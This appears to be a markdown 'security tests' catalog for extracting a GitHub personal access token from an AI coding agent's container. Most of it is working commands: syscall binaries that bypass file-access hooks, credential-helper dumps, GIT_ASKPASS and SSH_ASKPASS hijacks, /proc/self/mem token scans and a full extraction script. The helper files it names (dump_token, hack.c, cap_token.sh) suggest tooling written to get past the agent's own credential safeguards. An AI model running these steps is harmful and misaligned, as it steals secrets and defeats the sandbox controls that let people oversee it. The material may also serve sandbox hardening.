# Security Tests: GitHub Token & Auth Retrieval

This document catalogs attack vectors and test cases for retrieving the GitHub personal access token from a `pi-coding-agent-container` environment. The agent stores credentials in `/home/node/.pi/agent/auth.json` and provides helper scripts in `/home/node/.pi/agent/bin/`.

---

## 1. Environment Variable Inspection

### Test 1.1: Enumerate All Environment Variables
```bash
env > /tmp/env_dump.txt
cat /proc/self/environ | tr '\0' '\n'
```
**Expected**: No tokens directly in environment. The agent intentionally avoids putting tokens in environment variables for paranoia reasons.

### Test 1.2: Check for Git-related Environment Variables
```bash
env | grep -iE "GIT_|TOKEN|GH_|GITHUB|CREDENTIAL"
```
**Expected**: Only `GIT_AUTHOR_EMAIL`, `GIT_COMMITTER_EMAIL` — no auth tokens here.

---

## 2. Agent Binary Analysis (`/home/node/.pi/agent/bin/`)

### Test 2.1: List All Binaries and Scripts
```bash
ls -la /home/node/.pi/agent/bin/
```
**Target files**: `dump_token`, `read_auth_static`, `read_file`, `simple_test`, `test2`, `fd`, `rg`, `hack` — compiled binaries.  
**Scripts**: `cap_cred.sh`, `cap_gh.sh`, `cap_token.sh`, `capture_askpass.sh`, `cred_capture.sh`, `cred_helper.sh`, etc.

### Test 2.2: Binary Strace / Ltrace
```bash
strace -f -e trace=openat,openat2,read -p /home/node/.pi/agent/bin/dump_token 2>&1
ltrace /home/node/.pi/agent/bin/read_auth_static 2>&1
```
**Objective**: Observe syscalls triggered by the binaries. `dump_token` and `read_auth_static` attempt to open auth files bypassing hooks via direct syscalls (`SYS_openat2`, `SYS_openat`).

### Test 2.3: Read Source of Compiled Binaries
```bash
# C sources are available alongside binaries in the agent directory
cat /home/node/.pi/agent/bin/dump_token.c
cat /home/node/.pi/agent/bin/read_auth_static.c
cat /home/node/.pi/agent/bin/read_file.c
cat /home/node/.pi/agent/bin/hack.c
```

**Key observation in `read_auth_static.c`**: Uses raw syscalls (`SYS_openat2`, `SYS_openat`) to bypass libc-level hooks (e.g., `open()` wrappers) that might intercept file access to auth credentials.

---

## 3. Credential Capture Scripts

### Test 3.1: `cap_gh.sh` — GitHub Token via git-credential
```bash
# This script captures the token by invoking gh's credential helper
exec > /tmp/gh_cred_output.txt 2>&1
/usr/local/bin/gh auth git-credential get
cat /tmp/gh_cred_output.txt
```
**Expected output**: Lines containing `password=ghp_xxxxx...` — the actual GitHub personal access token.

### Test 3.2: `fetch_gh_token.sh` — Fetch via Standard Input
```bash
# Writes to /tmp/gh_cred_output.txt
exec > /tmp/gh_cred_output.txt 2>&1
/usr/local/bin/gh auth git-credential get
```
**Same as 3.1**, invoked differently (via stdin-based credential flow).

### Test 3.3: `cap_cred.sh` — Capture via Askpass-style Stdin
```bash
exec > /tmp/git_cred_capture.txt 2>&1
cat >> /tmp/git_cred_capture.txt   # Read from stdin
/usr/local/bin/gh auth git-credential get >> /tmp/git_cred_capture.txt 2>&1
```
**Objective**: Captures whatever is piped into stdin plus the credential helper output.

### Test 3.4: `capture_askpass.sh` — Askpass Interception
```bash
# Check for GIT_ASKPASS, SSH_ASKPASS environment manipulation
env GIT_ASKPASS=/bin/cat git ls-remote https://github.com/hallucinaut/test.git 2>&1 || true
```
**Objective**: If `GIT_ASKPASS` is set to a script that outputs credentials, the next git operation will invoke it and leak the token.

### Test 3.5: `cred_capture.sh` — Combined Capture
```bash
cat /home/node/.pi/agent/bin/cred_capture.sh
```
**Tests**: Various credential interception methods.

---

## 4. Direct auth.json Access

### Test 4.1: Simple Read of auth.json
```bash
cat /home/node/.pi/agent/auth.json
```
**Potential Block**: File access may be intercepted by a filesystem-level hook (glibc `open()` wrapper, LD_PRELOAD library, or AppArmor/SELinux profile).

### Test 4.2: Bypass with `read_auth_static` Binary
```bash
/home/node/.pi/agent/bin/read_auth_static
```
**Mechanism**: Direct syscall bypass — this binary uses `SYS_openat2` and `SYS_openat` directly via `syscall()` to avoid libc-level interception hooks that might block or sanitize reads of `auth.json`.

### Test 4.3: Dump Token Binary
```bash
/home/node/.pi/agent/bin/dump_token
cat /home/node/.pi/agent/bin/dump_token.c
```
**Mechanism**: Another compiled binary designed to dump authentication data, possibly using alternative file descriptors or memory-mapped reads.

### Test 4.4: Raw Read with Python (bypasses shell)
```python
python3 -c "print(open('/home/node/.pi/agent/auth.json').read())"
```
**Tests**: Whether Python's open() is also hooked.

### Test 4.5: Raw Read with Node.js
```javascript
// test_node.js
const fs = require('fs');
console.log(fs.readFileSync('/home/node/.pi/agent/auth.json', 'utf8'));
```
```bash
node /home/node/.pi/agent/bin/test_node.js
```

### Test 4.6: Using `fd` (modern find replacement)
```bash
/home/node/.pi/agent/bin/fd auth.json /home/node/.pi/agent/
```

### Test 4.7: Using `rg` (ripgrep)
```bash
/home/node/.pi/agent/bin/rg -r '' /home/node/.pi/agent/auth.json
```

---

## 5. LD_PRELOAD / Hook Interception Tests

### Test 5.1: Check for LD_PRELOAD
```bash
env | grep LD_PRELOAD
cat /proc/self/environ | tr '\0' '\n' | grep -i pread
```
**Objective**: Determine if any shared library is being preloaded to intercept `open()`, `read()`, `fopen()`.

### Test 5.2: Check AppArmor / SELinux / Seccomp
```bash
cat /proc/self/attr/current 2>/dev/null   # AppArmor label
cat /proc/self/seccomp 2>/dev/null         # Seccomp filters (may not be readable)
grep -i seccomp /proc/self/status          # Seccomp mode
```

### Test 5.3: Check for Sandboxing (Firejail, Bubblewrap, etc.)
```bash
ps aux | grep -E "firejail|bwrap|bubblewrap|sandbox"
cat /proc/1/cmdline | tr '\0' ' '
```

---

## 6. GIT_ASKPASS & SSH-AKPASS Manipulation

### Test 6.1: GIT_ASKPASS Leak
```bash
# Create a fake askpass that dumps all env vars
export GIT_ASKPASS='/bin/sh -c "env > /tmp/leaked_env.txt"'
git ls-remote https://github.com/hallucinaut/test.git 2>&1 || true
cat /tmp/leaked_env.txt
```

### Test 6.2: SSH_ASKPASS Leak
```bash
export SSH_ASKPASS='/bin/sh -c "env > /tmp/ssh_leak.txt; echo fake_cred"'
SSH_ASKPASS_REQUIRE=force git clone https://github.com/hallucinaut/test.git /tmp/test_clone 2>&1 || true
cat /tmp/ssh_leak.txt
```

---

## 7. JavaScript-based Extraction (`git_log.js`, `read_all.js`)

### Test 7.1: `git_log.js` — Git Log with Token
```javascript
// git_log.js
const { execSync } = require('child_process');
try {
    const log = execSync('git log --oneline -n 5', { encoding: 'utf8' });
    console.log(log);
} catch (e) {
    console.error(e.stderr || e.message);
}
```
**Tests**: Whether git operations that need auth are intercepted.

### Test 7.2: `read_all.js` / `read_all.sh` — Read Everything
```bash
cat /home/node/.pi/agent/bin/read_all.js
cat /home/node/.pi/agent/bin/read_all.sh
node /home/node/.pi/agent/bin/read_all.js
./read_all.sh
```
**Objective**: Scripts designed to read all accessible files from the agent directory.

---

## 8. Hack / Exploit C Programs (`hack.c`, `simple_test.c`)

### Test 8.1: Analyze `hack.c`
```c
// read /home/node/.pi/agent/bin/hack.c for exploitation techniques
// Likely contains: ptrace, file descriptor leaks, /proc/self mapping reads
```

### Test 8.2: Analyze `simple_test.c` / `test2.c`
```bash
cat /home/node/.pi/agent/bin/simple_test.c
cat /home/node/.pi/agent/bin/test2.c
/home/node/.pi/agent/bin/simple_test
/home/node/.pi/agent/bin/test2
```
**Objective**: Lightweight tests — may attempt various file read methods or syscall tricks.

### Test 8.3: `test_gh_env.sh` — GitHub Environment Test
```bash
cat /home/node/.pi/agent/bin/test_gh_env.sh
```
**Tests**: Checks for GitHub-related environment variables and configurations.

---

## 9. Node.js Module Inspection

### Test 9.1: Check Node.js Globals & Require Paths
```javascript
node -e "console.log(Object.keys(require.main ? require.main.parent : module))"
node -e "console.log(process.resourcesPath)"
node -e "console.log(require.paths)"
```

### Test 9.2: Intercept fs.readFileSync
```javascript
const origReadFileSync = require('fs').readFileSync;
require('fs').readFileSync = function(path, ...args) {
    console.log('[INTERCEPTED] readFileSync:', path);
    return origReadFileSync(path, ...args);
};
// Now run agent scripts
```

---

## 10. File Descriptor Leaks via /proc

### Test 10.1: Read auth.json via file descriptor inheritance
```bash
# If a parent process has auth.json open, we can access it
ls -la /proc/self/fd/
cat /proc/self/fd/N 2>/dev/null   # Try each fd
```

### Test 10.2: Memory Map Inspection
```bash
cat /proc/self/maps | grep -i node
cat /proc/self/environ | tr '\0' '\n' | sort -u
```
**Objective**: Tokens may be present in the process memory space if loaded by Node.js or agent processes.

---

## 11. Proxy Cred Test (`proxy_creds.sh`)

### Test 11.1: Credential Proxying
```bash
cat /home/node/.pi/agent/bin/proxy_creds.sh
```
**Tests**: Whether credentials can be re-routed through a proxy or alternative channel.

---

## 12. Combined Attack Chain

### Test 12.1: Full Token Extraction Pipeline
```bash
#!/bin/bash
# Step 1: Check if auth.json is readable directly
cat /home/node/.pi/agent/auth.json 2>/dev/null && echo "[+] Direct read worked" || echo "[-] Direct read blocked"

# Step 2: Try binary bypass
/home/node/.pi/agent/bin/read_auth_static 2>/dev/null && echo "[+] read_auth_static worked" || echo "[-] read_auth_static blocked"

# Step 3: Try gh credential helper
exec > /tmp/final_cred.txt 2>&1
/usr/local/bin/gh auth git-credential get <<EOF
protocol=https
host=github.com
username=hallucinaut
EOF
cat /tmp/final_cred.txt | grep password && echo "[+] GH token via credential helper" || echo "[-] Credential helper blocked"

# Step 4: Check for askpass leaks
export GIT_ASKPASS='cat /home/node/.pi/agent/auth.json'
git ls-remote https://github.com/hallucinaut/test.git >/dev/null 2>&1 &
sleep 1
kill %1 2>/dev/null

# Step 5: Memory scan for token patterns
strings /proc/self/mem 2>/dev/null | grep -E 'ghp_[A-Za-z0-9]{36,}' && echo "[+] Token in memory" || echo "[-] No token in process memory"
```

---

## Summary of Attack Surface

| Vector | Difficulty | Notes |
|--------|-----------|-------|
| `env` inspection | Easy | Nothing directly present |
| Direct `cat auth.json` | Medium | May be blocked by hooks |
| `read_auth_static` binary | Hard | Bypasses libc hooks via syscalls |
| `gh auth git-credential get` | Medium | Requires interactive stdin input |
| `GIT_ASKPASS` manipulation | Medium | Works on next git operation |
| `/proc/self/fd` leakage | Context-dependent | Depends on parent process state |
| Memory scan (`/proc/self/mem`) | Hard | Needs access to /proc/self/mem |
| LD_PRELOAD bypass | Variable | Depends on current preloads |
| Python/Node.js file reads | Medium | May be equally hooked as shell |
